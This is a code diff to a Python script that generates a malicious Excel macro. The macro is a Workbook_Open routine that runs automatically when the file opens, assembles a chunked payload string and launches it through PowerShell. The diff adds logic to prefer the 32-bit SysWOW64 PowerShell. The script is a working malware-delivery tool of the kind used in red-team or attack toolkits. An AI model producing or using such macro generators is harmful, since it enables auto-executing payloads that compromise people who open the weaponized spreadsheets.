@@ -64,6 +64,8 @@ else:
  top = "Sub Workbook_Open()\r\n"
  top = top + "Dim str As String\r\n"
  top = top + "Dim exec As String\r\n"
+ top = top + "Dim sysroot\r\n"
+ top = top + "Dim wshShell\r\n"
  
  #insert '\r\n' and 'str = str +' every 48 chars after the first 54.
  payL = formStr("str", str(cut[1]))
@@ -74,7 +76,20 @@ else:
  cut[0] = cut[0] + "\\\"\" \" & str & \" \\\"\" " + cut[2] +"\""
 
  #execStr = formStr("exec", str(cut[0]))
- execStr = "exec = \"C:\\Windows\\Syswow64\\WindowsPowershell\\v1.0\\" +str(cut[0]) + "\""
+ execStr = "exec = \"%systemroot%\\Syswow64\\WindowsPowershell\\v1.0\\" +str(cut[0]) + "\""
+
+ # write something to detrect syswow64 so it always runs a 32bit version
+
+
+ execStr = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
+ execStr = execStr + "Set wshShell = CreateObject(\"WScript.Shell\")\n"
+ execStr = execStr + "sysroot = wshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\")\n"
+ execStr = execStr + "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
+ execStr = execStr + "If objFSO.FolderExists(sysroot + \"\\Syswow64\\WindowsPowershell\\v1.0\\\") Then\n"
+ execStr = execStr + "exec = sysroot + \"\Syswow64\\WindowsPowershell\\v1.0\\" +str(cut[0]) + "\"\n"
+ execStr = execStr + "Else\n"
+ execStr = execStr + "exec = \"" +str(cut[0]) + "\"\n"
+ execStr = execStr + "End If\n"
 
  shell = "Shell(exec)"
  bottom = "End Sub\r\n"
@@ -93,4 +108,3 @@ else:
  	sys.exit(1)
  
  print "File written to " + sys.argv[2] + " !"
- print "If its 64bit the system should call powershell from syswow64. If its 32bit the system can call this just from the norm directory"
